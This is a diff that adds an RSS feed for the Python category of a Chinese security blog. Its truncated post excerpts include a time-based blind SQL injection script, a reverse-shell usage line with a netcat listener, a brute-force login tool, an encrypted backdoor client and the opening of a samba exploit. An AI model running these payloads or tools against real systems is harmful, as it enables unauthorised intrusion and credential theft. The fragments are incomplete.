@@ -1,0 +1,192 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Python on Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+    <link>https://lcx.cc/categories/python/</link>
+    <description>Recent content in Python on Nuclear&#39;Atk（核攻击）网络安全实验室</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <copyright>Nuclear&#39;Atk（核攻击）网络安全实验室</copyright>
+    <lastBuildDate>Thu, 10 Sep 2015 15:26:26 +0800</lastBuildDate><atom:link href="https://lcx.cc/categories/python/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>python延迟注入</title>
+      <link>https://lcx.cc/post/4566/</link>
+      <pubDate>Thu, 10 Sep 2015 15:26:26 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4566/</guid>
+      <description>#!/usr/bin/env python # -*- coding: utf-8 -*- # 延迟注入工具 import urllib2 import time import socket import threading import requests class my_threading(threading.Thread): def __init__(self, str,x): threading.Thread.__init__(self) self.str = str self.x = x def run(self): global res x=self.x j = self.str url = &#34;http://localhost/demo/1.php?username=root&#39;+and+if%281=%28mid%28lpad%28bin%28ord%28mid%28%28select%20user()%29,&#34; + str(x) + &#34;,1%29%29%29,8,0%29,&#34;+ str(j) + &#34;,1%29%29,sleep%282%29,0%29%23&#34; html = request(url) verify = &#39;timeout&#39; if verify not in html: res[str(j)] = 0 #print 1</description>
+    </item>
+    
+    <item>
+      <title>python富文本XSS过滤器开发与研究</title>
+      <link>https://lcx.cc/post/4516/</link>
+      <pubDate>Thu, 09 Apr 2015 09:23:17 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4516/</guid>
+      <description>python富文本XSS过滤器 phith0n (我也不会难过 你不要小看我) | 2015-04-08 22:23 前言：那天我正在开发网站最关键的部分——XSS过滤器，女神突然来电话说：“</description>
+    </item>
+    
+    <item>
+      <title>[翻译]Python开发中的密码散列(Hashing)</title>
+      <link>https://lcx.cc/post/4475/</link>
+      <pubDate>Tue, 06 Jan 2015 14:18:15 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4475/</guid>
+      <description>[翻译]Python开发中的密码散列(Hashing) 杀戮 (乌云安全实验室的杂役) | 2015-01-04 23:17 去年7月的一篇小文，看着还不错，就翻译了，当然还是我</description>
+    </item>
+    
+    <item>
+      <title>python多线程暴力破解路由登陆账号密码，HTTP基础认证暴力破解</title>
+      <link>https://lcx.cc/post/4438/</link>
+      <pubDate>Thu, 30 Oct 2014 20:19:38 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4438/</guid>
+      <description>运行时请在其目录下添加 user.txt、passwd.txt 两文件。否则会报错。 程序没有加异常处理。 代码比较挫…… #coding:utf-8- import base64 import urllib2 import Queue import threading,re,sys queue = Queue.Queue() class</description>
+    </item>
+    
+    <item>
+      <title>python 乌云账号暴力猜解工具</title>
+      <link>https://lcx.cc/post/4432/</link>
+      <pubDate>Fri, 26 Sep 2014 12:02:51 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4432/</guid>
+      <description>python 乌云账号暴力猜解工具 Rona (111) | 2014-09-24 17:19 需要预安装如下程序 1、pytesseract （可以pip install pytesseract安装） 2、Python Imaging Library (PIL)</description>
+    </item>
+    
+    <item>
+      <title>纯 Python 解 fun.coolshell.cn</title>
+      <link>https://lcx.cc/post/4410/</link>
+      <pubDate>Mon, 11 Aug 2014 14:45:44 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4410/</guid>
+      <description>一个有意思的挑战解谜，http://fun.coolshell.cn 0-Fuck your brain 根据 title 在 Google 搜索 “fuck brain”，结果第一条 Brainfuck - Wikipedia, the free encyclopedia 根据维</description>
+    </item>
+    
+    <item>
+      <title>python爬取所有厂商url&amp;python爬取Google搜索结果产生的猥琐想法</title>
+      <link>https://lcx.cc/post/4342/</link>
+      <pubDate>Sat, 24 May 2014 11:02:55 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4342/</guid>
+      <description>一直有这么一个想法。当得到某0day，我怎样才能最快知道在某大厂商的任意子域名、任意端口下是否存在此漏洞。 于是猥琐的想法就产生了，首先得到乌</description>
+    </item>
+    
+    <item>
+      <title>python加密通讯后门</title>
+      <link>https://lcx.cc/post/4322/</link>
+      <pubDate>Tue, 13 May 2014 10:10:11 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4322/</guid>
+      <description>加密通讯内容过一些检测数据包匹配关键字的ips和ids还是可以的，简单的demo。 client.py # client import socket import time import binascii import base64 import pyDes import sys #use des iv = &#39;2132435465768797&#39; key = &#39;aa000000000000000000000002200000000000aa0000000d&#39; #data = &#34;afuckfucdfadf&#34; #des def encrypt(iv,</description>
+    </item>
+    
+    <item>
+      <title>python 反弹shell，加了UDP</title>
+      <link>https://lcx.cc/post/3823/</link>
+      <pubDate>Wed, 21 Aug 2013 08:44:03 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3823/</guid>
+      <description>自己改的python 反弹shell，加了UDP，放出来给大家分享 用来对付一些把除了80端口都封了的变态网管 用法 back.py 123.123.123.123 53 udp nc监听： nc -l 53 -u 后面</description>
+    </item>
+    
+    <item>
+      <title>InsightScan:Python多线程Ping/端口扫描 &#43; HTTP服务/APP 探测</title>
+      <link>https://lcx.cc/post/3806/</link>
+      <pubDate>Mon, 12 Aug 2013 11:14:19 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3806/</guid>
+      <description>InsightScan:Python多线程Ping/端口扫描 + HTTP服务/APP 探测，可生成Hydra用的IP列表。 现成的工具没一个好用的</description>
+    </item>
+    
+    <item>
+      <title>[渗透技巧]python脚本处理伪静态注入</title>
+      <link>https://lcx.cc/post/3612/</link>
+      <pubDate>Thu, 20 Jun 2013 18:19:51 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3612/</guid>
+      <description>目前有很多网站做了rewrite，如 /?id=1 /1 /1111.php 大趋势下，攻击的门槛逐渐增高。这样有利有弊，喜欢研究的会深入钻研，另一方面只会用工具不懂原理的则充</description>
+    </item>
+    
+    <item>
+      <title>自动审计flash的python脚本</title>
+      <link>https://lcx.cc/post/3283/</link>
+      <pubDate>Thu, 17 Jan 2013 10:33:45 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3283/</guid>
+      <description>之前写的一个简单的通过google搜索结果自动反编译flash文件并进行审计的工具。 代码是从以前写的其他代码中扣过来的，很烂，用的时候就将就</description>
+    </item>
+    
+    <item>
+      <title>Python Pickle反序列化带来的安全问题</title>
+      <link>https://lcx.cc/post/3276/</link>
+      <pubDate>Tue, 15 Jan 2013 06:51:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3276/</guid>
+      <description>Author: wofeiwo#80sec.com 数据序列化，这是个很常见的应用场景，通常被广泛应用在数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接</description>
+    </item>
+    
+    <item>
+      <title>定位GFW的python脚本，如何找到GFW设备的IP地址</title>
+      <link>https://lcx.cc/post/3179/</link>
+      <pubDate>Tue, 18 Dec 2012 00:31:43 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3179/</guid>
+      <description>github上有人释出了一个python脚本mongol.py，可以定位中国防火长城的物理位置和数量。 mongol.py以密歇根大学计算机系</description>
+    </item>
+    
+    <item>
+      <title>[Python] samba 0day</title>
+      <link>https://lcx.cc/post/2933/</link>
+      <pubDate>Tue, 25 Sep 2012 08:40:24 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2933/</guid>
+      <description>By: a guest&amp;nbsp; on Sep 24th, 2012&amp;nbsp; |&amp;nbsp; syntax: Python&amp;nbsp; |&amp;nbsp; size: 6.92 KB&amp;nbsp; |&amp;nbsp; hits: 3,930&amp;nbsp; |&amp;nbsp; expires: Never #!/usr/bin/python # # finding targets 4 31337z: # gdb /usr/sbin/smbd `ps auwx | grep smbd | grep -v grep | head -n1 | awk &#39;{ print $2 }&#39;` &amp;lt;&amp;lt;&amp;lt; `echo -e &#34;print system&#34;` | grep &#39;$1&#39; # -&amp;gt; to get system_libc_addr, enter this value in the &#39;system_libc_offset&#39; value of the</description>
+    </item>
+    
+    <item>
+      <title>Python shellexec 动态扩展模块</title>
+      <link>https://lcx.cc/post/2877/</link>
+      <pubDate>Fri, 14 Sep 2012 09:16:06 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2877/</guid>
+      <description>做测试用的，顺手写的一个python的c模块code，放在这里存放下做个sample。 这个模块主要是用c扩展了python，其中存在一个sy</description>
+    </item>
+    
+    <item>
+      <title>【Python】获取NTP服务器最后活动的IP地址、monlist 命令</title>
+      <link>https://lcx.cc/post/2307/</link>
+      <pubDate>Thu, 08 Mar 2012 17:54:02 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2307/</guid>
+      <description>半年前研究 NTP&amp;nbsp;反射型 DDOS，测试 NTP 时间服务器用的，ntp_ip_enum.py，源码如下： #!/usr/bin/env python &#34;&#34;&#34; Basic script to pull addresses from a NTP server using the monlist command. Can</description>
+    </item>
+    
+    <item>
+      <title>怎样在 Windows XP、Windows 7 等操作系统中下载和安装 Python</title>
+      <link>https://lcx.cc/post/2099/</link>
+      <pubDate>Sat, 31 Dec 2011 03:46:50 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2099/</guid>
+      <description>Python的安装程序以及源代码可以从其官方网站获取。以Windows XP、Python 3.1.3为例，在Windows下安装Python的</description>
+    </item>
+    
+    <item>
+      <title>Plone zope远程命令执行漏洞(python)</title>
+      <link>https://lcx.cc/post/2073/</link>
+      <pubDate>Thu, 22 Dec 2011 20:30:24 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2073/</guid>
+      <description>Plone zope远程命令执行漏洞(python) 全文 Versions Affected (without hotfix): Plone 4.0 (through 4.0.9); Plone 4.1; Plone 4.2 (a1 and a2); Zope 2.12.x and Zope 2.13.x. Versions Not Affected: Versions of Plone that use Zope other than Zope 2.12.x and Zope 2.13.x. Advisory/Hotfix: http://plone.org/products/plone/security/advisories/20110928 You can execute any command on the remote Plone</description>
+    </item>
+    
+    <item>
+      <title>【0day】ActivePerl和ActivePython提权漏洞</title>
+      <link>https://lcx.cc/post/383/</link>
+      <pubDate>Fri, 06 Aug 2010 12:53:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/383/</guid>
+      <description>威胁原因：ActivePerl和ActivePython for win X86 安装配置问题。 利用需求：默认安装了以上任意一种，相对应的Python26\Sc</description>
+    </item>
+    
+  </channel>
+</rss>
